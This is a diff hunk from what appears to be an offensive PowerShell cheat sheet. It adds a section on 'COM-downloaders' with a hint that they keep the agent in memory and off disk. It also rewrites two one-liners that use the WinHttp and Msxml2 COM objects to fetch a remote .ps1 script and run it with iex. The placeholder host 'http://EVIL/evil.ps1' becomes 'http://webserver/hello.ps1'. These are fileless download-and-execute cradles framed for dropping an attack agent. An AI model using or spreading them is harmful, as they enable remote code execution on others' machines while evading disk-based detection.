@@ -901,12 +901,14 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 ---
 
+      [ COM-downloaders - Additional Methods for Remote Download ]
       The follow oneliner's are also downloaders using diferent COM objects like 'WinHttp' or 'Msxml2'
+      HINT: The follow downloaders will not drop the agent on disk (download/exec in ram)
 
 <br />
 
-      $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText
-      $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://EVIL/evil.ps1',$false);$h.send();iex $h.responseText
+      $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://webserver/hello.ps1',$false);$h.send();iex $h.responseText
+      $h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://webserver/hello.ps1',$false);$h.send();iex $h.responseText
 
 ![powershell Additional Methods for Remote Download](http://i.cubeupload.com/tMG9I8.jpg)
 
